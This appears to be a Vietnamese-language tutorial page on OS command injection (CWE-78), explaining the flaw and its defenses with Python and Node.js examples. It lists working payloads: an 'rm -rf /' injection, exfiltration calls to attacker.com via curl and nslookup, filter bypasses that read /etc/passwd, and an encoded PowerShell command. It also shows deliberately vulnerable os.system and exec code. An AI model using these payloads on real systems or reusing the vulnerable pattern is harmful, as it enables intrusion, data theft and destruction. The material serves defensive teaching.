# Command Execution

> **CWE**: CWE-78 (Improper Neutralization of Special Elements used in an OS Command) | **Phân loại**: Injection

## Kiến thức Nền tảng

Hãy tưởng tượng máy chủ của bạn giống như một văn phòng làm việc lớn, và hệ điều hành là người quản lý trực tiếp điều hành văn phòng đó thông qua các dòng lệnh (OS Shell). Để giao tiếp với người quản lý này, chúng ta sử dụng những câu lệnh cụ thể. Shell còn hỗ trợ các ký tự đặc biệt, giống như các liên từ trong câu (ví dụ: `;`, `&`, `|`), để kết hợp nhiều lệnh lại với nhau. Thông thường, một ứng dụng an toàn sẽ gọi trực tiếp các chương trình khác bằng cách gửi tham số dạng tĩnh (như truyền một danh sách đối số và đặt `shell=False`). Cách làm này giống như việc bạn gửi một tài liệu đã được đóng dấu niêm phong cho người quản lý; họ chỉ đọc nội dung bên trong chứ không tự ý làm thêm bất kỳ việc gì ngoài lề.

```python
import subprocess

def check_network_connectivity(host_ip):
    # Safe subprocess spawning (normal operation)
    # By passing arguments as a list and setting shell=False (default),
    # the operating system executes the 'ping' binary directly.
    # Any shell metacharacters in host_ip are treated as literal arguments, not command symbols.
    command = ["ping", "-c", "1", host_ip]
    result = subprocess.run(command, capture_output=True, text=True, shell=False)
    return result.stdout
```

## Mô tả lỗ hổng

Lỗ hổng Command Execution (hay OS Command Injection) xảy ra khi ứng dụng web hành động như một người truyền tin thiếu cảnh giác: nhận thông điệp từ người dùng rồi ghép nối trực tiếp vào câu lệnh gửi cho hệ điều hành. Kẻ tấn công có thể chèn thêm các ký tự đặc biệt để kết thúc câu lệnh cũ và mở ra một câu lệnh mới hoàn toàn độc hại. Hãy hình dung bạn yêu cầu ứng dụng kiểm tra mạng bằng lệnh `ping [IP]`, nhưng kẻ xấu lại nhập vào IP là `8.8.8.8; rm -rf /`. Thay vì chỉ kiểm tra mạng, máy chủ sẽ thực thi luôn cả lệnh xóa sạch dữ liệu. Lỗ hổng này cực kỳ nguy hiểm vì nó cho phép kẻ tấn công vượt qua mọi lớp bảo vệ của ứng dụng để ra lệnh trực tiếp cho hệ điều hành, dẫn đến việc mất dữ liệu, cài đặt mã độc hoặc chiếm quyền kiểm soát hoàn toàn hệ thống.

## Cơ chế tấn công

Các biến thể tấn công Command Injection và kỹ thuật bypass phổ biến bao gồm:

*   **Blind Time-based Command Injection**: Khi ứng dụng thực thi lệnh nhưng không trả về kết quả ra màn hình. Kẻ tấn công sử dụng các lệnh gây trễ để kiểm tra sự tồn tại của lỗ hổng.
    *   *Payload*: `; sleep 5` hoặc `& ping -c 6 127.0.0.1 &`
*   **Blind OOB (Out-of-Band) Command Injection**: Kẻ tấn công kích hoạt một kết nối mạng đi ra ngoài (như HTTP hoặc DNS) để truyền dữ liệu nhạy cảm thu thập được.
    *   *Payload HTTP*: `; curl http://attacker.com/$(whoami)`
    *   *Payload DNS*: `; nslookup $(whoami).attacker.com`
*   **Filter Bypass (Vượt qua bộ lọc)**:
    *   *Tránh khoảng trắng*: Sử dụng biến môi trường `$IFS` (Internal Field Separator) trong Linux hoặc ngoặc nhọn:
        `cat$IFS/etc/passwd` hoặc `{cat,/etc/passwd}`
    *   *Sử dụng Wildcards (`?`, `*`)*: Thay thế các ký tự bị chặn bằng ký tự đại diện:
        `/???/c?t /???/p??s??` (chạy lệnh `/bin/cat /etc/passwd`)
    *   *Ký tự xuống dòng (`%0a`)*: Khi dấu `;` bị chặn, dấu xuống dòng được URL encode có thể dùng để bắt đầu một lệnh mới:
        `ip=127.0.0.1%0awhoami`
*   **Windows Payloads**: Khai thác trên môi trường Windows bằng PowerShell hoặc CMD.
    *   *Sử dụng Base64 Encoded trong PowerShell*:
        `powershell -enc SUBHAGkAZQA=` (tương đương lệnh `whoami` được mã hóa UTF-16LE + Base64).
    *   *Ghép lệnh trên Windows*: Sử dụng `&` hoặc `&&` để chạy lệnh nối tiếp:
        `dir & whoami`

## Biện pháp phòng thủ

- **Tóm tắt**: Tránh gọi shell hệ thống trực tiếp, sử dụng API hệ điều hành để khởi tạo tiến trình con với mảng tham số riêng biệt (`shell=False`).
- **Các bước chi tiết**:
  - Không truyền chuỗi đầu vào trực tiếp vào các hàm như `os.system()` hoặc `exec()`.
  - Sử dụng mảng đối số với các hàm an toàn như `subprocess.run(..., shell=False)` trong Python hoặc `child_process.execFile` trong Node.js.
  - Sử dụng danh sách trắng (whitelist) nghiêm ngặt để xác thực cấu trúc của tham số đầu vào.
  - Phân quyền tối thiểu cho tài khoản chạy dịch vụ web để giới hạn phạm vi tác động nếu bị khai thác.

## Code Example

```python
# === VULNERABLE CODE (Python) ===
import os

def check_ip_vulnerable(user_input):
    # DANGER: Directly concatenating input into os.system executes it via shell
    # Input like "127.0.0.1; sleep 5" will trigger time-based injection
    command = f"ping -c 1 {user_input}"
    os.system(command)

# === SECURE CODE (Python) ===
import subprocess
import re

def check_ip_secure(user_input):
    # Validate format to ensure input is strictly an IP address
    if not re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", user_input):
        raise ValueError("Invalid IP Address format")
        
    # SECURE: Arguments passed as a list, running /bin/ping directly without shell
    subprocess.run(["ping", "-c", "1", user_input], shell=False, capture_output=True)
```

```javascript
// === VULNERABLE CODE (Node.js) ===
const { exec } = require('child_process');

function pingVulnerable(ip) {
  // DANGER: exec invokes a shell, allowing metacharacter exploitation
  exec(`ping -c 1 ${ip}`, (err, stdout) => {
    console.log(stdout);
  });
}

// === SECURE CODE (Node.js) ===
const { execFile } = require('child_process');

function pingSecure(ip) {
  // SECURE: execFile runs the executable directly without invoking a shell
  execFile('ping', ['-c', '1', ip], (err, stdout) => {
    console.log(stdout);
  });
}
```

## Xem thêm

- [Code Injection](../code-injection/) — Tấn công chèn mã trực tiếp vào runtime của ngôn ngữ lập trình (như eval) thay vì gọi lệnh hệ điều hành.
- [File Upload](../../06-insecure-design/file-upload/) — Tải lên tệp tin độc hại (web shell) để đạt được thực thi lệnh từ xa trên máy chủ.
- [Remote Code Execution](../../10-exceptional-conditions/remote-code-execution/) — Khái niệm thực thi mã từ xa trên máy chủ đích thông qua nhiều vector tấn công khác nhau.

## Nguồn tham khảo

- PortSwigger: https://portswigger.net/web-security/os-command-injection
- OWASP: https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
- CWE: https://cwe.mitre.org/data/definitions/78.html

## Giải thích thuật ngữ

- **Command Execution**: Lỗ hổng thực thi lệnh hệ điều hành trái phép do người dùng chèn vào.
- **OS Shell**: Giao diện dòng lệnh giúp tương tác và điều khiển hệ điều hành.
- **Metacharacters**: Ký tự đặc biệt (như `;`, `&`, `|`) dùng để điều khiển luồng lệnh trong shell.
- **Subprocess**: Tiến trình con được sinh ra để thực hiện một tác vụ riêng biệt.
- **RCE**: Thực thi mã từ xa, cho phép chạy các lệnh hệ thống tùy ý từ xa.
